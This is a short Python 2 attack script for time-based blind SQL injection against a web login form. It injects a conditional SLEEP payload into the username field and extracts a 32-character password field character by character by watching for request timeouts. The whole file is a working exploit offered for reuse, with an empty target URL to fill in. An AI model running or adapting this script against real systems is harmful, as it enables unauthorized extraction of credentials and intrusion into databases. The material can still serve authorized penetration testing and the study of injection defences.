#!/usr/bin/env python
# Time-based blind SQL injection
# Darahh
# Tweak as you need

import requests
import string

characters =  string.digits + string.letters + "!#$&\()*+,-./:;<=>?@[]^{|}~_"

TARGET_URL = ''
#Prob hashed ???
PASS_LENGTH = 32
FIELD = 'password'
sqlSleep = 5
requestTimeOut = 1

r = requests.post(TARGET_URL)
if r.status_code != requests.codes.ok:
	print 'Cannot connect the specified URL'
	exit()
else:
	print 'Connection OK! We can go now...'

print "Time-Based BlindSQLing..."
foundChars =''
for i in range(PASS_LENGTH):
	for c in characters:
		evilSQL = "' OR 1=1 AND IF("+FIELD+" like BINARY '"+foundChars+c+"%',sleep("+str(sqlSleep)+"),null)#"
		params = {'inputName': evilSQL, 'inputPassword': 'probnotimportant'}
		try:
			r = requests.post(TARGET_URL, data=params, timeout=requestTimeOut)
			#print c
		except requests.exceptions.Timeout:
			foundChars += c
			print "Found chars ("+str(len(foundChars))+") : " + foundChars
			break
